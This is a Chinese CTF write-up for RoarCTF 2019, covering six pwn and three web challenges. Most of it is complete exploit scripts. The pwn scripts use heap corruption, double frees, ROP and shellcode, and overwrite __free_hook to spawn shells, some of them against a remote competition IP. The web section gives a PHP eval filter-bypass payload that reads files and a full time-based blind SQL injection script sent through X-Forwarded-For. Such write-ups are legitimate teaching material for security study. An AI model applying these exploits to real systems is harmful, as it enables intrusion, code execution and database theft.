@@ -1,0 +1,1512 @@
+# Roarctf 部分Writeup
+
+阅读量 **867544**
+
+|评论 **4**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2019-10-18 12:00:30
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p4.ssl.qhimg.com/t0175df70b06543cfeb.png)
+
+## pwn
+
+###  easypwn
+
+程序有后门规则，直接利用该规则就行利用即可。
+
+    
+    
+    __int64 __fastcall sub_E26(signed int size, unsigned int c_size)
+    {
+      __int64 result; // rax
+    
+      if ( size > (signed int)c_size )
+        return c_size;
+      if ( c_size - size == 10 )
+        LODWORD(result) = size + 1;
+      else
+        LODWORD(result) = size;
+      return (unsigned int)result;
+    }
+    
+
+脚本：
+
+    
+    
+    #!/usr/bin/python2
+    # -*- coding:utf-8 -*-    
+    from pwn import *
+    import os
+    import struct
+    import random
+    import time
+    import sys
+    import signal
+    
+    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
+    
+    def clear(signum=None, stack=None):
+        print('Strip  all debugging information')
+        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
+        exit(0)
+    
+    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
+        signal.signal(sig, clear)
+    
+    # # Create a symbol file for GDB debugging
+    # try:
+    #     gdb_symbols = '''
+    
+    #     '''
+    
+    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
+    #     f.write(gdb_symbols)
+    #     f.close()
+    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    # except Exception as e:
+    #     print(e)
+    
+    context.arch = 'amd64'
+    # context.arch = 'i386'
+    context.log_level = 'debug'
+    execve_file = './easypwn'
+    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
+    # sh = process(execve_file)
+    sh = remote('39.97.182.233', 30099)
+    elf = ELF(execve_file)
+    # libc = ELF('./libc-2.23.so')
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    
+    # Create temporary files for GDB debugging
+    try:
+        gdbscript = '''
+    
+        '''
+    
+        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
+        f.write(str(proc.pidof(sh)[0]))
+        f.close()
+    
+        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
+        f.write(gdbscript)
+        f.close()
+    except Exception as e:
+        pass
+    
+    def create(size):
+        sh.sendlineafter(': ', '1')
+        sh.sendlineafter(': ', str(size))
+    
+    def edit(index, size, content):
+        sh.sendlineafter(': ', '2')
+        sh.sendlineafter(': ', str(index))
+        sh.sendlineafter(': ', str(size))
+        sh.sendafter(': ', content)
+    
+    def drop(index):
+        sh.sendlineafter(': ', '3')
+        sh.sendlineafter(': ', str(index))
+    
+    def show(index):
+        sh.sendlineafter(': ', '4')
+        sh.sendlineafter(': ', str(index))
+    
+    create(0x18)
+    create(0x18)
+    create(0x68)
+    create(0x18)
+    edit(0, 0x18 + 10, 'a' * 0x18 + p8(0x91))
+    drop(1)
+    create(0x18) # 1
+    show(2)
+    sh.recvuntil('content: ')
+    result = sh.recvn(8)
+    libc_addr = u64(result) - 0x3c4b78
+    log.success('libc_addr: ' + hex(libc_addr))
+    edit(2, 0x10, p64(0) + p64(libc_addr + libc.symbols['__free_hook'] - 0x40))
+    create(0x68)
+    drop(4)
+    edit(2, 8, p64(libc_addr + libc.symbols['__free_hook'] - 0x33))
+    create(0x68)
+    create(0x68)
+    edit(5, 0x23 + 8, '' * 0x23 + p64(libc_addr + libc.symbols['system']))
+    edit(0, 8, '/bin/sh')
+    drop(0)
+    
+    sh.interactive()
+    clear()
+    
+
+###  easyrop
+
+明显的栈溢出，通过程序读取文件夹属性的功能来判断靶机环境。然后注意溢出的index即可。程序禁用了execve系统调用，可以直接ROP读取flag或者shellcode读取。
+
+    
+    
+    #!/usr/bin/python2
+    # -*- coding:utf-8 -*-    
+    from pwn import *
+    import os
+    import struct
+    import random
+    import time
+    import sys
+    import signal
+    
+    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
+    
+    def clear(signum=None, stack=None):
+        print('Strip  all debugging information')
+        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
+        exit(0)
+    
+    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
+        signal.signal(sig, clear)
+    
+    # # Create a symbol file for GDB debugging
+    # try:
+    #     gdb_symbols = '''
+    
+    #     '''
+    
+    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
+    #     f.write(gdb_symbols)
+    #     f.close()
+    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    # except Exception as e:
+    #     print(e)
+    
+    context.arch = 'amd64'
+    # context.arch = 'i386'
+    context.log_level = 'debug'
+    execve_file = './easyrop'
+    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
+    # sh = process(execve_file)
+    sh = remote('39.97.182.233', 32970)
+    elf = ELF(execve_file)
+    # libc = ELF('./libc-2.27.so')
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    
+    # Create temporary files for GDB debugging
+    try:
+        gdbscript = '''
+        b *0x401B2B
+        '''
+    
+        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
+        f.write(str(proc.pidof(sh)[0]))
+        f.close()
+    
+        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
+        f.write(gdbscript)
+        f.close()
+    except Exception as e:
+        pass
+    
+    pause()
+    
+    layout = [
+        0x0000000000400640, # : ret
+    
+        0x0000000000401b93, # : pop rdi ; ret
+        elf.got['puts'],
+    
+        elf.plt['puts'],
+    
+        0x4019F3, # main
+    ]
+    sh.sendlineafter('>> ', 'a' * 0x418 + p8(0x28) + flat(layout))
+    sh.recvuntil('path.n')
+    result = sh.recvuntil('n', drop=True)
+    libc_addr = u64(result.ljust(8, '')) - libc.symbols['puts']
+    log.success('libc_addr: ' + hex(libc_addr))
+    
+    layout = [
+        0x0000000000401b93, # : pop rdi ; ret
+        elf.bss(),
+    
+        libc_addr + libc.symbols['gets'],
+    
+        0x0000000000401b93, # : pop rdi ; ret
+        elf.bss() & 0xfffffffffffff000,
+        libc_addr + 0x0000000000023e6a, #: pop rsi; ret;
+        0x1000 ,
+        libc_addr + 0x0000000000001b96, #: pop rdx; ret; 
+        7 ,
+        libc_addr + libc.symbols['mprotect'],
+    
+        elf.bss(),
+    ]
+    
+    sh.sendlineafter('>> ', 'a' * 0x418 + p8(0x28) + flat(layout))
+    
+    shellcode = asm('''
+    mov rax, 0x67616c662f2e
+    push rax
+    mov rdi, rsp
+    xor esi, esi
+    mov eax, 2
+    syscall
+    
+    cmp eax, 0
+    jg next
+    push 1
+    mov edi, 1
+    mov rsi, rsp
+    mov edx, 4
+    mov eax, edi
+    syscall
+    jmp exit
+    
+    next:
+    mov edi, eax
+    mov rsi, rsp
+    mov edx, 0x100
+    xor eax, eax
+    syscall
+    
+    mov edx, eax
+    mov edi, 1
+    mov rsi, rsp
+    mov eax, edi
+    syscall
+    
+    exit:
+    xor edi, edi
+    mov eax, 231
+    syscall
+    ''')
+    
+    
+    sh.sendline(shellcode)
+    
+    sh.interactive()
+    clear()
+    
+
+###  easyheap
+
+程序并没有开启pie，利用后门函数构造 double free 控制 .bss 段来泄露地址并劫持 hook。
+
+    
+    
+    #!/usr/bin/python2
+    # -*- coding:utf-8 -*-    
+    from pwn import *
+    import os
+    import struct
+    import random
+    import time
+    import sys
+    import signal
+    
+    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
+    
+    def clear(signum=None, stack=None):
+        print('Strip  all debugging information')
+        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
+        exit(0)
+    
+    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
+        signal.signal(sig, clear)
+    
+    # # Create a symbol file for GDB debugging
+    # try:
+    #     gdb_symbols = '''
+    
+    #     '''
+    
+    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
+    #     f.write(gdb_symbols)
+    #     f.close()
+    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    # except Exception as e:
+    #     print(e)
+    
+    context.arch = 'amd64'
+    # context.arch = 'i386'
+    context.log_level = 'debug'
+    execve_file = './easyheap'
+    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
+    # sh = process(execve_file)
+    sh = remote('39.97.182.233', 41564)
+    elf = ELF(execve_file)
+    # libc = ELF('./libc-2.27.so')
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    
+    # Create temporary files for GDB debugging
+    try:
+        gdbscript = '''
+        b malloc
+        '''
+    
+        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
+        f.write(str(proc.pidof(sh)[0]))
+        f.close()
+    
+        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
+        f.write(gdbscript)
+        f.close()
+    except Exception as e:
+        pass
+    
+    def add(size, content):
+        sh.sendlineafter('>> ', '1')
+        sh.sendlineafter('sizen', str(size))
+        sh.sendafter('contentn', content)
+    
+    def add2(size, content):
+        time.sleep(0.1)
+        sh.sendline('1')
+        time.sleep(0.1)
+        sh.send(str(size).ljust(8, ''))
+        time.sleep(0.1)
+        sh.send(content)
+    
+    def free():
+        sh.sendlineafter('>> ', '2')
+    
+    sh.sendafter('username:', p64(0) + p64(0x71) + p64(0x602060))
+    sh.sendafter('info:', p64(0) + p64(0x21))
+    
+    sh.sendlineafter('>> ', '666')
+    sh.sendlineafter('free?n', '1')
+    sh.sendafter('contentn', 'n')
+    
+    add(0x18, 'n')
+    
+    sh.sendlineafter('>> ', '666')
+    sh.sendlineafter('free?n', '2')
+    
+    add(0x68, 'n')
+    add(0x68, 'n')
+    free()
+    sh.sendlineafter('>> ', '666')
+    sh.sendlineafter('free?n', '2')
+    free()
+    add(0x68, p64(0x602060))
+    add(0x68, 'n')
+    add(0x68, 'n')
+    add(0x68, p64(0x602060) + 'a' * 0x10 + p64(elf.got['puts']) + p64(0xDEADBEEFDEADBEEF))
+    
+    sh.sendlineafter('>> ', '3')
+    result = sh.recvuntil('n', drop=True)
+    libc_addr = u64(result.ljust(8, '')) - 0x6f690
+    log.success('libc_addr: ' + hex(libc_addr))
+    main_arena_addr = libc_addr + 0x3c4b20
+    log.success('main_arena_addr: ' + hex(main_arena_addr))
+    add2(0x68, p64(main_arena_addr - 0x33))
+    add2(0x68, 'n')
+    
+    '''
+    0x45216 execve("/bin/sh", rsp+0x30, environ)
+    constraints:
+      rax == NULL
+    
+    0x4526a execve("/bin/sh", rsp+0x30, environ)
+    constraints:
+      [rsp+0x30] == NULL
+    
+    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+    constraints:
+      [rsp+0x50] == NULL
+    
+    0xf1147 execve("/bin/sh", rsp+0x70, environ)
+    constraints:
+      [rsp+0x70] == NULL
+    '''
+    
+    add2(0x68, 'b' * 0xb + p64(libc_addr + 0xf1147) + p64(libc_addr + libc.symbols['realloc'] + 20))
+    
+    # pause()
+    add2(0x68, 'cat flag >&0n')
+    
+    sh.interactive()
+    clear()
+    
+
+###  realloc_magic
+
+存在 double free ， 观察 realloc 源码可知当传入的chunk不为空，且size为0的情况下，会free掉原chunk并且返回0。
+
+    
+    
+      if (bytes == 0 && oldmem != NULL)
+        {
+          __libc_free (oldmem); return 0;
+        }
+    
+
+利用上面的技巧并配合漏洞劫持 tcache ，然后劫持 stdout， 最后劫持 hook， 由于其中需要爆破两次，所以概率是 1/256 。
+
+    
+    
+    #!/usr/bin/python2
+    # -*- coding:utf-8 -*-    
+    from pwn import *
+    import os
+    import struct
+    import random
+    import time
+    import sys
+    import signal
+    
+    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
+    
+    def clear(signum=None, stack=None):
+        print('Strip  all debugging information')
+        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
+        exit(0)
+    
+    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
+        signal.signal(sig, clear)
+    
+    # # Create a symbol file for GDB debugging
+    # try:
+    #     gdb_symbols = '''
+    
+    #     '''
+    
+    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
+    #     f.write(gdb_symbols)
+    #     f.close()
+    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    # except Exception as e:
+    #     print(e)
+    
+    context.arch = 'amd64'
+    # context.arch = 'i386'
+    # context.log_level = 'debug'
+    execve_file = './realloc_magic'
+    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
+    sh = process(execve_file)
+    # sh = remote('39.97.182.233', 37783)
+    # elf = ELF(execve_file)
+    # libc = ELF('./libc-2.27.so')
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    
+    # Create temporary files for GDB debugging
+    try:
+        gdbscript = '''
+        def pr
+            x/gx &realloc_ptr
+            end
+    
+        b realloc
+        '''
+    
+        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
+        f.write(str(proc.pidof(sh)[0]))
+        f.close()
+    
+        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
+        f.write(gdbscript)
+        f.close()
+    except Exception as e:
+        pass
+    
+    def realloc(size, content):
+        sh.sendlineafter('>> ', '1')
+        sh.sendlineafter('?n', str(size))
+        sh.sendafter('?n', str(content))
+    
+    def free():
+        sh.sendlineafter('>> ', '2')
+    
+    
+    
+    realloc(0x68, 'n')
+    free()
+    realloc(0x18, 'n')
+    realloc(0, '')
+    realloc(0x48, 'n')
+    free()
+    realloc(0, '')
+    
+    heap_two_byte = random.randint(0, 0xf) * 0x1000 + 0x0010
+    log.info('heap_two_byte: ' + hex(heap_two_byte))
+    # realloc(0x68, 'a' * 0x18 + p64(0x201) + p16(0x7010))
+    realloc(0x68, 'a' * 0x18 + p64(0x201) + p16(heap_two_byte))
+    realloc(0, '')
+    realloc(0x48, 'n')
+    
+    realloc(0, '')
+    
+    # sh.sendlineafter('>> ', '666')
+    realloc(0x48, 'xff' * 0x40)
+    # realloc(0x58, 'a' * 0x18 + '' * 0x20 + p64(0x1f1) + p16(0x7050))
+    realloc(0x58, 'a' * 0x18 + '' * 0x20 + p64(0x1f1) + p16(heap_two_byte + 0x40))
+    realloc(0, '')
+    
+    realloc(0x18, p64(0) + p64(0))
+    realloc(0, '')
+    
+    two_byte = random.randint(0, 0xf) * 0x1000 + 0x0760
+    log.info('two_byte: ' + hex(two_byte))
+    # realloc(0x1e8, p64(0) * 4 + 'x60x07xdd')
+    realloc(0x1e8, p64(0) * 4 + p16(two_byte))
+    realloc(0, '')
+    
+    realloc(0x58, p64(0xfbad2887 | 0x1000) + p64(0) * 3 +p8(0xc8))
+    
+    result = sh.recvn(8)
+    libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
+    log.success('libc_addr: ' + hex(libc_addr))
+    sh.sendlineafter('>> ', '666')
+    realloc(0x1e8, 'a' * 0x18 + p64(libc_addr + libc.symbols['__free_hook'] - 8))
+    realloc(0, '')
+    realloc(0x48, '/bin/sh' + p64(libc_addr + libc.symbols['system']))
+    sh.sendlineafter('>> ', '1')
+    sh.sendlineafter('?n', str(0))
+    
+    sh.interactive()
+    clear()
+    
+
+###  ez_op
+
+模拟虚拟机，没有任何防护，直接改 free 的hook 为 system 函数即可，最后留下字符串 sh 为参数就能起shell。
+
+    
+    
+    #!/usr/bin/python2
+    # -*- coding:utf-8 -*-    
+    from pwn import *
+    import os
+    import struct
+    import random
+    import time
+    import sys
+    import signal
+    
+    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
+    
+    def clear(signum=None, stack=None):
+        print('Strip  all debugging information')
+        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
+        exit(0)
+    
+    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
+        signal.signal(sig, clear)
+    
+    # # Create a symbol file for GDB debugging
+    # try:
+    #     gdb_symbols = '''
+    
+    #     '''
+    
+    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
+    #     f.write(gdb_symbols)
+    #     f.close()
+    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    # except Exception as e:
+    #     print(e)
+    
+    context.arch = 'amd64'
+    # context.arch = 'i386'
+    # context.log_level = 'debug'
+    execve_file = './pwn'
+    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
+    # sh = process(execve_file)
+    sh = remote('39.97.182.233', 41610)
+    elf = ELF(execve_file)
+    # libc = ELF('./libc-2.27.so')
+    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    
+    # Create temporary files for GDB debugging
+    try:
+        gdbscript = '''
+        b *0x0804A36C
+        c
+        '''
+    
+        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
+        f.write(str(proc.pidof(sh)[0]))
+        f.close()
+    
+        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
+        f.write(gdbscript)
+        f.close()
+    except Exception as e:
+        pass
+    
+    PUSH = 0x2A3D
+    POP = 0xFFFF28
+    GET = -1
+    ADD = 0
+    SUB = 0x11111
+    DIV = 0x514
+    SET = 0x10101010
+    system_addr = 0x08051C60
+    __free_hook_addr = 0x80E09F0
+    
+    opcode = [
+        PUSH,
+        PUSH,
+        PUSH,
+        GET,
+        PUSH,
+        SUB,
+        DIV,
+        SET,
+    ]
+    payload = ' '.join([str(v) for v in opcode])
+    sh.sendline(payload)
+    
+    data = [
+        system_addr,
+        4,
+        67,
+        __free_hook_addr + 4,
+        u32('sh'),
+    ]
+    payload = ' '.join([str(v) for v in data])
+    sh.sendline(payload)
+    
+    sh.interactive()
+    clear()
+    
+
+###  checkin
+
+用gmp库实现的RSA算法，参数 e 可控，所以可以控制其在内存中的内容。
+
+利用解密函数泄露出heap地址和libc地址，再根据 realloc 函数的特性劫持 hook 即可。
+
+    
+    
+    #!/usr/bin/python2
+    # -*- coding:utf-8 -*-    
+    from pwn import *
+    import os
+    import struct
+    import random
+    import time
+    import sys
+    import signal, binascii
+    
+    salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
+    
+    def clear(signum=None, stack=None):
+        print('Strip  all debugging information')
+        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
+        exit(0)
+    
+    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
+        signal.signal(sig, clear)
+    
+    # # Create a symbol file for GDB debugging
+    # try:
+    #     gdb_symbols = '''
+    
+    #     '''
+    
+    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
+    #     f.write(gdb_symbols)
+    #     f.close()
+    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
+    # except Exception as e:
+    #     print(e)
+    
+    context.arch = 'amd64'
+    # context.arch = 'i386'
+    # context.log_level = 'debug'
+    execve_file = './checkin'
+    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
+    sh = process(execve_file)
+    # sh = remote('', 0)
+    elf = ELF(execve_file)
+    # libc = ELF('./libc-2.27.so')
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    
+    # Create temporary files for GDB debugging
+    try:
+        gdbscript = '''
+        def pr
+            x/40gx $rebase(0x203040)
+            end
+        # b *$rebase(0x1544)
+        b realloc
+        '''
+    
+        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
+        f.write(str(proc.pidof(sh)[0]))
+        f.close()
+    
+        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
+        f.write(gdbscript)
+        f.close()
+    except Exception as e:
+        pass
+    
+    
+    def pull(index, hex):
+        sh.sendlineafter('choice:', '1')
+        sh.sendlineafter(':n', str(index))
+        sh.sendlineafter(':n', hex)
+    
+    def fire(index):
+        sh.sendlineafter('choice:', '2')
+        sh.sendlineafter(':n', str(index))
+        sh.recvuntil(':n')
+        return sh.recvuntil('Discard', drop=True)
+    
+    def bomb():
+        sh.sendlineafter('choice:', '3')
+        sh.recvuntil('0x')
+        return sh.recvuntil('n', drop=True)
+    
+    pull(9, '01')
+    pull(12, '01')
+    
+    pull(0, '11' * 0x58)
+    pull(1, '22' * 0x58)
+    fire(0)
+    fire(1)
+    result = fire(0)[-8:]
+    heap_addr = u64(result, endian='big') - 0xb20
+    log.success('heap_addr: ' + hex(heap_addr))
+    
+    fire(1)
+    fire(0)
+    fire(1)
+    fire(0)
+    pull(2, '11' * 0x410)
+    
+    result = fire(0)[-8:]
+    libc_addr = u64(result, endian='big') - 0x3ebd00
+    log.success('libc_addr: ' + hex(libc_addr))
+    
+    pause()
+    chunk_addr = p64(libc_addr + libc.symbols['__malloc_hook'] + 0x10 - 0x33, endian='big')
+    pull(0, binascii.b2a_hex(chunk_addr ))
+    pull(3, '11' * 0x58)
+    
+    system = p64(libc_addr + libc.symbols['system'], endian='big')
+    
+    pull(6, binascii.b2a_hex('/bin/sh'[::-1]))
+    payload = '00' * 8 + binascii.b2a_hex(system) + '11' * 0xb
+    payload = payload.rjust(0x58 * 2, '1')
+    pull(4,  payload)
+    pull(6, '11' * 0x18 + binascii.b2a_hex('/bin/sh'[::-1]))
+    
+    sh.interactive()
+    clear()
+    
+
+## web
+
+###  easy_calc
+
+这道题刚打开看到是一个计算器功能，一开始以为是ssti。并且发现有个calc.php
+
+    
+    
+    <?php
+    error_reporting(0);
+    if(!isset($_GET['num'])){
+        show_source(__FILE__);
+    }else{
+            $str = $_GET['num'];
+            $blacklist = [' ', 't', 'r', 'n',''', '"', '`', '[', ']','$','\','^'];
+            foreach ($blacklist as $blackitem) {
+                    if (preg_match('/' . $blackitem . '/m', $str)) {
+                            die("what are you want to do?");
+                    }
+            }
+            eval('echo '.$str.';');
+    }
+    ?>
+    
+
+发现过滤了一些字符，和国赛的math题有点像，但是奇怪的是这里num输入字符无法解析。也就是说有waf让num参数只能是数字。怎么绕过去呢？
+
+前几天读到一个php的一个字符串解析特性绕过bypass。
+
+<https://www.freebuf.com/articles/web/213359.html>
+
+就是在num前面加个空格等一些字符就能绕过了。
+
+剩下的就很简单了，利用chr()函数绕过特殊字符的限制来进行代码执行读flag。
+
+    
+    
+    calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+    
+
+![](https://s2.ax1x.com/2019/10/14/uzfNex.png)
+
+###  easy_java
+
+这道题个人感觉就是考了一些java web的一些基础知识。突破点就是弱口令，和一个脑洞filename。
+
+这里的弱口令是admin/admin888,进入后可以看到一个图片images/img1.jpg
+
+![](https://s2.ax1x.com/2019/10/14/uzhujA.png)
+
+但是通过get怎么都无法dowload下这个图片，后来对友说这是个post。
+
+![](https://s2.ax1x.com/2019/10/14/uz4m5T.png)
+
+这下就可以了。然后就去读文件了:
+
+![](https://s2.ax1x.com/2019/10/14/uz4DsA.png)
+
+![](https://s2.ax1x.com/2019/10/14/uz4TZq.png)
+
+base64解密后就是flag
+
+![](https://s2.ax1x.com/2019/10/14/uz5iFK.png)
+
+###  online_proxy
+
+根据“可能会收集信息”的提示，在 `X-Forwarded-For` 处fuzz出来注入点。
+
+然后就是注入的套路，二分法，时间盲注。然后就是在库里面找flag。。。找了很久才找到。
+
+BTW，ssrf完全没用的。
+
+附上完整注入脚本：
+
+    
+    
+    import requests
+    import string
+    import random
+    import time
+    import sys
+    
+    url = 'http://*********************.4hou.com.cn:*****/'
+    
+    def rand_str(length=8):
+        return ''.join(random.sample(string.ascii_letters + string.digits, length))
+    
+    def brute_schema(i, c):
+        cookies = {"track_uuid": "ad6e17bd-1a8b-442e-f834-%s" % rand_str()}
+        headers = {"X-Forwarded-For": "1' and if(binary(select substr(table_schema,%d,1) from information_schema.tables group by table_schema limit 4,1)>=char(%d),sleep(1),0))#" % (i, ord(c))}
+        headers["X-Forwarded-For"] += rand_str()
+        while True:
+            try:
+                requests.get(url, headers=headers, cookies=cookies, timeout=3)
+            except:
+                continue
+            break
+        headers["X-Forwarded-For"] = rand_str()
+        t1 = 0
+        t2 = 0
+        while True:
+            try:
+                t1 = time.time()
+                requests.get(url, headers=headers, cookies=cookies, timeout=3)
+                t2 = time.time()
+            except:
+                continue
+            break
+        if t2 - t1 > 1: return True
+        return False
+    
+    def brute_table(i, c):
+        cookies = {"track_uuid": "ad6e17bd-1a8b-442e-f834-%s" % rand_str()}
+        headers = {"X-Forwarded-For": "1' and if(binary(select substr(table_name,%d,1) from information_schema.tables where table_schema='F4l9_D4t4B45e' limit 0,1)>=char(%d),sleep(2),0))#" % (i, ord(c))}
+        headers["X-Forwarded-For"] += rand_str()
+        while True:
+            try:
+                requests.get(url, headers=headers, cookies=cookies, timeout=3)
+            except:
+                continue
+            break
+        headers["X-Forwarded-For"] = rand_str()
+        t1 = 0
+        t2 = 0
+        while True:
+            try:
+                t1 = time.time()
+                requests.get(url, headers=headers, cookies=cookies, timeout=3)
+                t2 = time.time()
+            except:
+                continue
+            break
+        if t2 - t1 > 2: return True
+        return False
+    
+    def brute_column(i, c):
+        cookies = {"track_uuid": "ad6e17bd-1a8b-442e-f834-%s" % rand_str()}
+        headers = {"X-Forwarded-For": "1' and if(binary(select substr(column_name,%d,1) from information_schema.columns where table_name='F4l9_t4b1e' limit 0,1)>=char(%d),sleep(2),0))#" % (i, ord(c))}
+        headers["X-Forwarded-For"] += rand_str()
+        while True:
+            try:
+                requests.get(url, headers=headers, cookies=cookies, timeout=3)
+            except:
+                continue
+            break
+        headers["X-Forwarded-For"] = rand_str()
+        t1 = 0
+        t2 = 0
+        while True:
+            try:
+                t1 = time.time()
+                requests.get(url, headers=headers, cookies=cookies, timeout=3)
+                t2 = time.time()
+            except:
+                continue
+            break
+        if t2 - t1 > 2: return True
+        return False
+    
+    def brute_flag(i, c):
+        cookies = {"track_uuid": "ad6e17bd-1a8b-442e-f834-%s" % rand_str()}
+        headers = {"X-Forwarded-For": "1' and if(binary(select substr(F4l9_c01umn,%d,1) from F4l9_D4t4B45e.F4l9_t4b1e limit 1,1)>=char(%d),sleep(1),0))#" % (i, ord(c))}
+        headers["X-Forwarded-For"] += rand_str()
+        while True:
+            try:
+                requests.get(url, headers=headers, cookies=cookies, timeout=3)
+            except:
+                continue
+            break
+        headers["X-Forwarded-For"] = rand_str()
+        t1 = 0
+        t2 = 0
+        while True:
+            try:
+                t1 = time.time()
+                requests.get(url, headers=headers, cookies=cookies, timeout=3)
+                t2 = time.time()
+            except:
+                continue
+            break
+        if t2 - t1 > 1: return True
+        return False
+    
+    '''
+    schema = ''
+    for i in range(999):
+        l = 0
+        m = 0
+        r = 0xff
+        while True:
+            m = (l + r) / 2
+            print l, m, r
+            if brute_schema(i + 1, chr(m)):
+                if m == l:
+                    schema += chr(l)
+                    break
+                l = m
+            else:
+                if m == l:
+                    schema += chr(l)
+                    break
+                r = m
+        print schema
+    '''
+    
+    '''
+    table = ''
+    for i in range(999):
+        l = 0
+        m = 0
+        r = 0xff
+        while True:
+            m = (l + r) / 2
+            print l, m, r
+            if brute_table(i + 1, chr(m)):
+                if m == l:
+                    table += chr(l)
+                    break
+                l = m
+            else:
+                if m == l:
+                    table += chr(l)
+                    break
+                r = m
+        print table
+    '''
+    
+    '''
+    column = ''
+    for i in range(999):
+        l = 0
+        m = 0
+        r = 0xff
+        while True:
+            m = (l + r) / 2
+            print l, m, r
+            if brute_column(i + 1, chr(m)):
+                if m == l:
+                    column += chr(l)
+                    break
+                l = m
+            else:
+                if m == l:
+                    column += chr(l)
+                    break
+                r = m
+        print column
+    '''
+    
+    
+    flag = ''
+    for i in range(len(flag),999):
+        l = 0
+        m = 0
+        r = 0xff
+        while True:
+            m = (l + r) / 2
+            print l, m, r
+            if brute_flag(i + 1, chr(m)):
+                if m == l:
+                    flag += chr(l)
+                    break
+                l = m
+            else:
+                if m == l:
+                    flag += chr(l)
+                    break
+                r = m
+        print flag
+    
+
